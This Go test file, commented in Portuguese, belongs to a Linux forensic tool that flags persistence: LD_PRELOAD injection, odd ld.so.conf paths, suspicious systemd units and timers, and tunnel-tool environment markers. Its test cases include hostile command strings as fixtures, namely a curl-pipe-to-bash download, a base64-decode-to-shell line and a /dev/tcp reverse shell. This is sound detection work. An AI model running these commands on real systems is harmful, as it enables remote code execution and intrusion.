package checks

import (
	"strings"
	"testing"

	"github.com/lex0c/aletheia/internal/check"
	"github.com/lex0c/aletheia/internal/env"
	"github.com/lex0c/aletheia/internal/facts"
)

// imgEnv: os checks de persistência valem em imagem montada, que é o modo em
// que o kernel é o DO ANALISTA e ocultamento por rootkit não acontece.
func imgEnv() *env.Env {
	e := testEnv()
	e.Source = env.SourceImage
	return e
}

// --- linker dinâmico (§7.8) ---

func TestPreloadDisparaPelaEXISTENCIA(t *testing.T) {
	f := &facts.Facts{Loader: facts.Loader{
		PreloadExists: true, PreloadLibs: []string{"/usr/lib/evil.so"},
	}}
	r := ldPreloadGlobal.Run(ldPreloadGlobal, f, imgEnv())
	if len(r.Findings) != 1 || r.Findings[0].Sev != check.SevCritical {
		t.Fatalf("achados = %v", r.Findings)
	}
	if !r.Findings[0].Irreversible {
		t.Error("a lib é a amostra: preservá-la antes de remover a linha é irreversível")
	}
}

// O arquivo existir e não ser LEGÍVEL não é "não existe". Tratar os dois igual
// deixaria o rootkit de userland mais comum passar por ausência.
func TestPreloadIlegivelAindaEhAchado(t *testing.T) {
	f := &facts.Facts{Loader: facts.Loader{PreloadExists: true, PreloadErr: "permission denied"}}
	r := ldPreloadGlobal.Run(ldPreloadGlobal, f, imgEnv())
	if len(r.Findings) != 1 {
		t.Fatal("arquivo ilegível precisa continuar sendo achado")
	}
	if !strings.Contains(strings.Join(r.Findings[0].Evidence, " "), "não pôde ser lido") {
		t.Error("e a evidência precisa dizer que não foi lido")
	}
}

func TestPreloadAusenteNaoDispara(t *testing.T) {
	if r := ldPreloadGlobal.Run(ldPreloadGlobal, &facts.Facts{}, imgEnv()); len(r.Findings) != 0 {
		t.Error("ausência é o estado normal")
	}
}

// É este check que invalida os outros: se o userland mente, achado vindo de
// binário do host deixa de valer como prova.
func TestPreloadRebaixaAConfiancaDaExecucaoInteira(t *testing.T) {
	f := &facts.Facts{Loader: facts.Loader{PreloadExists: true}}
	r := check.Run([]check.Check{ldPreloadGlobal}, f, imgEnv())
	if len(r.TrustBroken) == 0 {
		t.Error("o ID precisa estar na lista de trustBreakers do motor: sem isso, " +
			"o relatório segue afirmando coisas que o host pode ter forjado")
	}
}

func TestLdSoConfSeparaCaminhoDeSistemaDeGravavel(t *testing.T) {
	f := &facts.Facts{Loader: facts.Loader{SearchDirs: []facts.LoaderDir{
		{Dir: "/usr/lib/x86_64-linux-gnu", From: "/etc/ld.so.conf"},
		{Dir: "/opt/oracle/lib", From: "/etc/ld.so.conf.d/oracle.conf"},
		{Dir: "/usr/local/lib", From: "/etc/ld.so.conf"},
		{Dir: "/tmp/libs", From: "/etc/ld.so.conf.d/zz.conf"},
	}}}
	r := ldSoConfOdd.Run(ldSoConfOdd, f, imgEnv())
	if len(r.Findings) != 1 || r.Findings[0].Subject != "/tmp/libs" {
		t.Fatalf("achados = %v — /opt e /usr/local são instalação legítima fora do pacote",
			r.Findings)
	}
}

// Diretório declarado e INEXISTENTE é pior que estranho: quem conseguir criá-lo
// passa a fornecer biblioteca para todo binário do host.
func TestLdSoConfDizQuandoODiretorioNaoExiste(t *testing.T) {
	f := &facts.Facts{Loader: facts.Loader{SearchDirs: []facts.LoaderDir{
		{Dir: "/var/tmp/l", From: "/etc/ld.so.conf.d/x.conf", Exists: false},
	}}}
	r := ldSoConfOdd.Run(ldSoConfOdd, f, imgEnv())
	if !strings.Contains(strings.Join(r.Findings[0].Evidence, " "), "NÃO existe") {
		t.Errorf("evidência: %v", r.Findings[0].Evidence)
	}
}

// LD_PRELOAD carrega código; LD_LIBRARY_PATH só muda onde procurar. A
// severidade precisa refletir isso — o segundo é mau costume comum.
func TestEnvPreloadSeveridadePorVariavel(t *testing.T) {
	f := &facts.Facts{Loader: facts.Loader{EnvVars: []facts.EnvSetting{
		{File: "/etc/environment", Key: "LD_PRELOAD", Value: "/dev/shm/a.so"},
		{File: "/etc/environment", Key: "LD_LIBRARY_PATH", Value: "/opt/x/lib"},
	}}}
	r := envPreload.Run(envPreload, f, imgEnv())
	if len(r.Findings) != 2 {
		t.Fatalf("achados = %d, quer 2", len(r.Findings))
	}
	if r.Findings[0].Sev != check.SevCritical || r.Findings[1].Sev != check.SevWarn {
		t.Errorf("severidades = %s, %s", r.Findings[0].Sev, r.Findings[1].Sev)
	}
}

// --- systemd (§7.2) ---

func unit(name, path string, exec ...facts.ExecLine) facts.Unit {
	return facts.Unit{Name: name, Path: path, Kind: "service", Scope: "system", Exec: exec}
}

func ex(k, cmd string) facts.ExecLine { return facts.ExecLine{Key: k, Cmd: cmd} }

func TestExecSuspectClassifica(t *testing.T) {
	casos := []struct {
		cmd  string
		sev  check.Severity
		ok   bool
		nota string
	}{
		{"/usr/bin/nginx -g daemon off;", 0, false, "binário de sistema"},
		{"/tmp/.x", check.SevCritical, true, "executa de /tmp"},
		{"/dev/shm/agent", check.SevCritical, true, "tmpfs"},
		{"-/tmp/.x", check.SevCritical, true, "o prefixo - do systemd não pode esconder o caminho"},
		{"@/tmp/.x nome", check.SevCritical, true, "prefixo @"},
		{"/home/app/bin/svc", check.SevWarn, true, "diretório pessoal"},
		{"/bin/sh -c \"curl -s http://x/a | bash\"", check.SevCritical, true, "baixa e executa"},
		{"/bin/sh -c 'base64 -d /x | sh'", check.SevCritical, true, "decodifica e executa"},
		{"/bin/bash -c 'exec 3<>/dev/tcp/1.2.3.4/443'", check.SevCritical, true, "shell reverso embutido"},
		{"/usr/bin/curl -o /tmp/f http://x", 0, false, "baixa e NÃO executa: não é a forma"},
	}
	for _, c := range casos {
		_, sev, ok := execSuspect(c.cmd)
		if ok != c.ok || (ok && sev != c.sev) {
			t.Errorf("execSuspect(%q) = %s,%v — quer %s,%v (%s)",
				c.cmd, sev, ok, c.sev, c.ok, c.nota)
		}
	}
}

func TestUnitExecCarregaOContextoQueDecide(t *testing.T) {
	u := unit("updater.service", "/etc/systemd/system/updater.service", ex("ExecStart", "/tmp/.x"))
	u.Restart = "always"
	u.EnabledBy = []string{"/etc/systemd/system/multi-user.target.wants/updater.service"}
	f := &facts.Facts{Units: []facts.Unit{u}}

	r := unitExecSuspect.Run(unitExecSuspect, f, imgEnv())
	if len(r.Findings) != 1 {
		t.Fatalf("achados = %d", len(r.Findings))
	}
	ev := strings.Join(r.Findings[0].Evidence, " ")
	for _, quer := range []string{"HABILITADA", "ressuscita", "PRECEDÊNCIA"} {
		if !strings.Contains(ev, quer) {
			t.Errorf("falta %q no contexto — é o que decide se a unit importa:\n%s", quer, ev)
		}
	}
}

// A §7.2 chama isto de persistência quase perfeita: o serviço mantém o nome, o
// .service fica intacto, e o payload roda antes dele subir. O sinal é a FORMA,
// não o comando — por isso dispara mesmo com comando de aparência inocente.
func TestDropInDisparaMesmoComComandoInocente(t *testing.T) {
	d := facts.Unit{
		Name: "ssh.service", Path: "/etc/systemd/system/ssh.service.d/over.conf",
		Kind: "service", Scope: "system", DropInFor: "ssh.service",
		Exec: []facts.ExecLine{ex("ExecStartPre", "/usr/bin/logger iniciando")},
	}
	f := &facts.Facts{Units: []facts.Unit{d}}
	r := unitDropIn.Run(unitDropIn, f, imgEnv())
	if len(r.Findings) != 1 {
		t.Fatalf("achados = %d", len(r.Findings))
	}
	if !strings.Contains(strings.Join(r.Findings[0].Evidence, " "), "systemctl cat") {
		t.Error("o achado precisa dizer COMO ver a config efetiva")
	}
}

// Drop-in que só ajusta limite ou ambiente é o uso RECOMENDADO do mecanismo.
// Disparar nele transformaria todo host gerenciado por Ansible em parede de aviso.
func TestDropInSemExecNaoDispara(t *testing.T) {
	d := facts.Unit{
		Name: "ssh.service", Path: "/etc/systemd/system/ssh.service.d/limits.conf",
		DropInFor: "ssh.service", Restart: "always",
	}
	f := &facts.Facts{Units: []facts.Unit{d}}
	if r := unitDropIn.Run(unitDropIn, f, imgEnv()); len(r.Findings) != 0 {
		t.Errorf("drop-in sem execução é o uso recomendado: %v", r.Findings[0].Evidence)
	}
}

func TestParseSystemdTime(t *testing.T) {
	casos := map[string]int{
		"30s": 30, "45": 45, "5min": 300, "2h": 7200,
		"1h30min": 5400, "1d": 86400, "": -1, "abc": -1, "10x": -1,
	}
	for in, quer := range casos {
		got, ok := parseSystemdTime(in)
		if quer < 0 {
			if ok {
				t.Errorf("parseSystemdTime(%q) aceitou lixo: %d", in, got)
			}
			continue
		}
		if !ok || got != quer {
			t.Errorf("parseSystemdTime(%q) = %d,%v — quer %d", in, got, ok, quer)
		}
	}
}

func TestCalendarInterval(t *testing.T) {
	casos := map[string]int{
		"minutely":        60,
		"hourly":          3600,
		"*-*-* *:*/5:00":  300,  // a cada 5 minutos
		"*-*-* *:*:*/30":  30,   // a cada 30 segundos
		"*-*-* */2:00:00": 7200, // a cada 2 horas
		"*-*-* 03:00:00":  -1,   // horário fixo: não é intervalo
		"daily":           -1,
	}
	for in, quer := range casos {
		got, _, ok := calendarInterval(in)
		if quer < 0 {
			if ok {
				t.Errorf("calendarInterval(%q) inventou intervalo: %d", in, got)
			}
			continue
		}
		if !ok || got != quer {
			t.Errorf("calendarInterval(%q) = %d,%v — quer %d", in, got, ok, quer)
		}
	}
}

func TestTimerSoDisparaEmIntervaloCurto(t *testing.T) {
	curto := facts.Unit{Name: "b.timer", Kind: "timer", Path: "/etc/systemd/system/b.timer",
		OnUnitActiveSec: "45s"}
	longo := facts.Unit{Name: "logrotate.timer", Kind: "timer",
		Path: "/usr/lib/systemd/system/logrotate.timer", Vendor: true,
		OnCalendar: []string{"daily"}}
	horario := facts.Unit{Name: "h.timer", Kind: "timer", Path: "/etc/systemd/system/h.timer",
		OnUnitActiveSec: "1h"}

	f := &facts.Facts{Units: []facts.Unit{curto, longo, horario}}
	r := unitTimerFrequent.Run(unitTimerFrequent, f, imgEnv())
	if len(r.Findings) != 1 || r.Findings[0].Subject != "b.timer" {
		t.Fatalf("achados = %v — só o intervalo curto é a forma do beacon", r.Findings)
	}
	if !strings.Contains(strings.Join(r.Findings[0].Evidence, " "), "correlacion") {
		t.Error("o achado precisa mandar correlacionar com a janela estendida")
	}
}

// Host sem systemd não tem persistência por unit para encontrar — o check
// cobriu tudo que havia. Declarar lacuna aqui faria toda varredura de Alpine
// sair degradada, que é o mesmo gritar-lobo que a ferramenta evita em processo.
func TestSemSystemdNaoEhLacunaDeCobertura(t *testing.T) {
	e := imgEnv()
	e.Caps &^= env.CapSystemd
	e.CapReason["systemd"] = "host sem systemd: checks de unit não se aplicam"

	r := check.Run([]check.Check{unitExecSuspect, unitDropIn, unitTimerFrequent},
		&facts.Facts{}, e)

	if r.Coverage.Complete != 3 {
		t.Errorf("cobertura = %d/3 · parciais %v · não verificados %v",
			r.Coverage.Complete, r.Coverage.Partial, r.Coverage.NotChecked)
	}
	if r.Coverage.Incomplete() {
		t.Error("ausência do mecanismo não é lacuna: não havia o que olhar")
	}
}

// --- família da ferramenta e preload por processo (§5.10, §7.8) ---

// Descobrir o NOME é o atalho mais barato do runbook: alguém já fez a
// engenharia reversa e publicou, e o que a ferramenta sabe fazer é o teto do
// que pode ter acontecido neste host.
func TestEnvToolMarkerEntregaAFamilia(t *testing.T) {
	f := &facts.Facts{Processes: []facts.Process{{
		PID: 19, Comm: "[kworker/1:2]", Exe: "/home/node/.config/htop/defunct",
		EnvKeys: []string{"PATH", "GSOCKET_ARGS", "GS_ARGS"},
	}}}
	r := envToolMarker.Run(envToolMarker, f, testEnv())
	if len(r.Findings) != 1 {
		t.Fatalf("achados = %d, quer 1 (uma família por processo)", len(r.Findings))
	}
	ev := strings.Join(r.Findings[0].Evidence, " ")
	for _, quer := range []string{"GSocket", "relay"} {
		if !strings.Contains(ev, quer) {
			t.Errorf("falta %q — o nome só vale se disser o que ele MUDA:\n%s", quer, ev)
		}
	}
}

func TestEnvToolMarkerNaoDisparaSemMarcador(t *testing.T) {
	f := &facts.Facts{Processes: []facts.Process{
		{PID: 1, EnvKeys: []string{"PATH", "HOME", "LANG"}},
		{PID: 2}, // environ ilegível: não afirma nada
	}}
	if r := envToolMarker.Run(envToolMarker, f, testEnv()); len(r.Findings) != 0 {
		t.Errorf("disparou sem marcador: %v", r.Findings[0].Evidence)
	}
}

// Como o preload global, este muda o valor de TODOS os outros achados.
func TestPreloadDeProcessoRebaixaAConfianca(t *testing.T) {
	f := &facts.Facts{Processes: []facts.Process{{
		PID: 30, PPID: 1, Comm: "sshd", Exe: "/usr/sbin/sshd",
		EnvKeys: []string{"LD_PRELOAD"},
		Env:     map[string]string{"LD_PRELOAD": "/dev/shm/x.so"},
	}}}
	r := check.Run([]check.Check{procLdPreload}, f, testEnv())
	if len(r.Findings) != 1 || r.Findings[0].Sev != check.SevCritical {
		t.Fatalf("achados = %v", r.Findings)
	}
	if len(r.TrustBroken) == 0 {
		t.Error("LD_PRELOAD num processo vivo precisa rebaixar a confiança da execução")
	}
	if !strings.Contains(strings.Join(r.Findings[0].Evidence, " "), "herdada") {
		t.Error("a variável é herdada: o achado precisa apontar o pai como origem")
	}
}

// Environ ilegível é desconhecimento, não ausência — sem root é a maioria dos
// processos, e calar isso reportaria "nenhum LD_PRELOAD" tendo olhado quase nada.
func TestPreloadDeProcessoContaEnvironIlegivel(t *testing.T) {
	f := &facts.Facts{Processes: []facts.Process{{PID: 10}, {PID: 11}}}
	r := procLdPreload.Run(procLdPreload, f, testEnv())
	if len(r.Partial) == 0 || !strings.Contains(r.Partial[0], "2") {
		t.Errorf("environ ilegível precisa virar cobertura parcial: %v", r.Partial)
	}
}

// A severidade separa "isto nunca é legítimo em servidor" de "isto é ferramenta
// legítima e a capacidade dela mudou o escopo da investigação".
func TestToolMarkerSeveridadePorFamilia(t *testing.T) {
	casos := map[string]check.Severity{
		"GSOCKET_ARGS":       check.SevCritical,
		"NGROK_AUTHTOKEN":    check.SevWarn,
		"RCLONE_CONFIG_PASS": check.SevWarn,
		"TUNNEL_TOKEN":       check.SevWarn,
	}
	for k, quer := range casos {
		f := &facts.Facts{Processes: []facts.Process{
			{PID: 10, Comm: "x", EnvKeys: []string{"PATH", k}},
		}}
		r := envToolMarker.Run(envToolMarker, f, testEnv())
		if len(r.Findings) != 1 {
			t.Errorf("%s: achados = %d", k, len(r.Findings))
			continue
		}
		if r.Findings[0].Sev != quer {
			t.Errorf("%s: severidade = %s, quer %s", k, r.Findings[0].Sev, quer)
		}
	}
}

// A variável é HERDADA. Reportar cada processo da árvore vira parede e aponta
// para as FOLHAS — o gatilho está na raiz.
func TestToolMarkerReportaSoARaizDaHeranca(t *testing.T) {
	env := []string{"PATH", "GS_ARGS"}
	f := &facts.Facts{Processes: []facts.Process{
		{PID: 100, PPID: 1, Comm: "implante", Exe: "/tmp/.x", EnvKeys: env},
		{PID: 101, PPID: 100, Comm: "filho", EnvKeys: env},
		{PID: 102, PPID: 101, Comm: "neto", EnvKeys: env},
		{PID: 1, Comm: "init", EnvKeys: []string{"PATH"}}, // sem o marcador
	}}
	r := envToolMarker.Run(envToolMarker, f, testEnv())
	if len(r.Findings) != 1 || r.Findings[0].Subject != "pid=100" {
		t.Fatalf("achados = %v — só a raiz vira achado", r.Findings)
	}
	if !strings.Contains(strings.Join(r.Findings[0].Evidence, " "), "2 processos descendentes") {
		t.Errorf("os descendentes precisam virar contagem no achado certo: %v",
			r.Findings[0].Evidence)
	}
}

// A supressão por herança NUNCA pode zerar um achado que existe.
//
// O caso que um cenário pegou: `sh -c` faz exec no último comando, então a
// PRÓPRIA aletheia vira o pai do que foi plantado na mesma sessão — e como ela
// herdou a variável, a supressão apagava o achado inteiro. Enxergar e não dizer
// é o pior resultado possível.
func TestToolMarkerNaoEmudeceQuandoOPaiEhAPropriaFerramenta(t *testing.T) {
	env := []string{"PATH", "GSOCKET_ARGS"}
	f := &facts.Facts{Processes: []facts.Process{
		{PID: 1, Comm: "aletheia", Self: true, EnvKeys: env},
		{PID: 19, PPID: 1, Comm: "[kworker/1:2]", Exe: "/home/n/.config/htop/defunct", EnvKeys: env},
	}}
	r := envToolMarker.Run(envToolMarker, f, testEnv())
	if len(r.Findings) != 1 || r.Findings[0].Subject != "pid=19" {
		t.Fatalf("achados = %v — a própria ferramenta não é origem de nada", r.Findings)
	}
}

// E quando a cadeia visível inteira carrega a variável, o achado sai mesmo
// assim, dizendo que a raiz não pôde ser isolada.
func TestToolMarkerCaiParaRedeDeSegurancaSemRaiz(t *testing.T) {
	env := []string{"GS_ARGS"}
	f := &facts.Facts{Processes: []facts.Process{
		// ciclo de ppid: nenhum é raiz
		{PID: 10, PPID: 11, Comm: "a", EnvKeys: env},
		{PID: 11, PPID: 10, Comm: "b", EnvKeys: env},
	}}
	r := envToolMarker.Run(envToolMarker, f, testEnv())
	if len(r.Findings) != 1 {
		t.Fatalf("achados = %d, quer 1", len(r.Findings))
	}
	if !strings.Contains(strings.Join(r.Findings[0].Evidence, " "), "não foi possível isolar a RAIZ") {
		t.Errorf("o achado precisa DIZER que a raiz não foi isolada: %v", r.Findings[0].Evidence)
	}
}

// O lugar da biblioteca é o que separa injeção de instrumentação. Errar para
// CRITICAL enche a tela de desktop; errar para WARN esconde o rootkit de
// userland mais comum.
func TestPreloadSeveridadePeloLugarDaLib(t *testing.T) {
	casos := map[string]check.Severity{
		"libmozsandbox.so":           check.SevWarn, // nome relativo
		"/usr/lib/libfakeroot.so":    check.SevWarn, // diretório de sistema
		"/usr/local/lib/libx.so":     check.SevWarn,
		"/tmp/.x.so":                 check.SevCritical, // gravável
		"/dev/shm/a.so":              check.SevCritical,
		"/home/app/.cache/l.so":      check.SevCritical,
		"/usr/lib/ok.so:/tmp/mau.so": check.SevCritical, // o pior manda
	}
	for v, quer := range casos {
		if got, _ := preloadSev(v); got != quer {
			t.Errorf("preloadSev(%q) = %s, quer %s", v, got, quer)
		}
	}
}

// Confiança só é rebaixada por achado CRÍTICO: nove processos do sandbox do
// Firefox fariam toda varredura de desktop imprimir "confiança rebaixada".
func TestSuspeitaNaoRebaixaAConfianca(t *testing.T) {
	f := &facts.Facts{Processes: []facts.Process{{
		PID: 100, Comm: "firefox", Exe: "/usr/lib/firefox/firefox",
		EnvKeys: []string{"LD_PRELOAD"},
		Env:     map[string]string{"LD_PRELOAD": "libmozsandbox.so"},
	}}}
	r := check.Run([]check.Check{procLdPreload}, f, testEnv())
	if len(r.Findings) != 1 || r.Findings[0].Sev != check.SevWarn {
		t.Fatalf("achados = %v", r.Findings)
	}
	if len(r.TrustBroken) != 0 {
		t.Error("aviso não pode rebaixar a confiança da execução inteira")
	}
}

// E a árvore de filhos do Firefox precisa virar UM achado, não nove.
func TestPreloadReportaSoARaizDaHeranca(t *testing.T) {
	e := map[string]string{"LD_PRELOAD": "/tmp/.x.so"}
	ks := []string{"LD_PRELOAD"}
	f := &facts.Facts{Processes: []facts.Process{
		{PID: 100, PPID: 1, Comm: "pai", EnvKeys: ks, Env: e},
		{PID: 101, PPID: 100, Comm: "f1", EnvKeys: ks, Env: e},
		{PID: 102, PPID: 100, Comm: "f2", EnvKeys: ks, Env: e},
		{PID: 1, Comm: "init", EnvKeys: []string{"PATH"}},
	}}
	r := procLdPreload.Run(procLdPreload, f, testEnv())
	if len(r.Findings) != 1 || r.Findings[0].Subject != "pid=100" {
		t.Fatalf("achados = %v — só a raiz", r.Findings)
	}
	if !strings.Contains(strings.Join(r.Findings[0].Evidence, " "), "2 processos descendentes") {
		t.Errorf("evidência: %v", r.Findings[0].Evidence)
	}
}
